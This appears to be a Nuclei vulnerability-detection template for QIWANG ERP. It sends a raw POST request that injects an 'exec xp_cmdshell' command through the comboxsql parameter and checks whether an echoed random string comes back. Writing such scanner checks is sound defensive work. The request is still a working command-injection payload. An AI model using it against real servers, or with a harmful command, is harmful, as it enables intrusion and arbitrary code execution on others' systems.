id: qiwang-erp-command-execution

info:
  name: QIWANG ERP Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    QIWANG ERP contains a command execution vulnerability that allows attackers to execute arbitrary commands on the server.
  reference:
    - http://www.wantit.com.cn
  tags: command-execution
  classification:
    cvss-score: 9.3

variables:
  check_str: "{{rand_text_alphanumeric(16)}}"

http:
  - raw:
      - |
        POST /mainFunctions/comboxstore.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        comboxsql=exec xp_cmdshell 'echo {{check_str}}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{check_str}}"
        part: body
